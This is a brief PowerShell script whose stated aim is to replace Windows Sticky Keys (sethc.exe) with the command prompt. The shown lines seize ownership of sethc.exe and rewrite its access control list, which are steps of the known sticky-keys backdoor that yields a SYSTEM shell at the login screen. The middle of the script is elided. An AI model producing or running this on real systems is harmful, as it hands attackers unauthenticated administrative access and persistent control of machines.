function replace-stickeywCMD {
<#
.SYNOPSIS
This is a scipt that will replace stickey keys with cmd prompt
.DESCRIPTION
.----. .----..----. .-.     .--.   .---. .----. .----..---. .-. .---. .-. .-..----..-.  .-..-. . .-. .---. .-.   .-..----. 
...
Set-Owner C:\Windows\System32\sethc.exe -Account BUILTIN\Administrators 
$file = Get-ChildItem 'C:\Program Files'
$file = $file[0]
Get-Acl $file.FullName | Set-Acl -Path C:\Windows\System32\sethc.exe
